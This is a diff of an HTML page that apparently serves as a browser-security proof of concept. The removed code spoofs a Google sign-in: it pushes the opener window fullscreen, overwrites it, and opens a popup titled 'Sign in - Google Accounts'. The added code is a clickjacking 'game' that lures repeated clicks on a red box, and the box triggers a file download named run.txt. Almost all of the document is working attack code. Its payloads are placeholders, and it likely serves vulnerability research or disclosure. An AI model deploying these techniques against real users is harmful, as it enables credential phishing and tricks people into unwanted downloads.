@@ -1,83 +1,50 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>URL Spoofing</title>
+  <title>Download Clickjack</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
 
-    <style>
-    	#button {
-			width:  150px;
-			height: 35px;
-		}
-   	</style>
-	
-	<script>
-        function spoof() {
+    #redBox {
+      position: absolute;
+      top: 10px;
+      right: 150px;
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      cursor: pointer;
+    }
 
-        	var openerHTML = `
-        		<html>
-        			<head>
-        				<style>
-        					body {
-        						margin: 0;
-   								padding: 0;
-        					}
+    #counter, #first {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 40px;
+    }
+  </style>
+  <script>
+    var clickCount = 0;
 
-        					#content {
-        						width:  100%;
-    							height: 100%;
-        					}
-        				</style>
-        			</head>
+function handleClick() {
+  clickCount++;
+  document.getElementById("counter").innerHTML = "x" + clickCount;
 
-        			<body>
-        				<img id="content" src="spoof.png"></img>
-        			</body>
-           		</html>
-        	`;
-
-        	var popupHTML = `
-        		<html>
-        			<head>
-        				<title>Sign in - Google Accounts</title>
-        				<style>
-        					body {
-        						margin: 0;
-   								padding: 0;
-        					}
-        					
-        					#content {
-        						width:  100%;
-    							height: 100%;
-        					}
-        				</style>
-        			</head>
-
-        			<body>
-        				<img id="content" src="sign.png"></img>
-        			</body>
-           		</html>
-        	`;
-
-            window.opener.document.documentElement.webkitRequestFullscreen();
-            window.opener.document.write(openerHTML);
-
-            var width=500, height=460, top=0, left=(screen.width/2)-(width/2);
-            var win = window.open("about:blank", "second", `width=${width},height=${height},top=${top},left=${left}`);
-			win.document.write(popupHTML);
-            window.close();	
-        }
-    </script>
+  if (clickCount == 2) {
+    document.getElementById("redBox").removeAttribute("href");
+  }
+}
+  </script>
 </head>
-
 <body>
-    <center>
-        <br>
-        <h1>
-        	Please confirm you want to signin into your Google Account<br><br>
-        	<button id="button" onclick="spoof();">Confirm</button>
-        </h1>
-    </center>
+  <div id="game">
+    <a id="redBox" href="data:text/html,clickjacked" onclick="handleClick()" download="run.txt"></a>
+    <div id="counter">Click 3x the Red Button to win!</div>
+  </div>
 </body>
 </html>
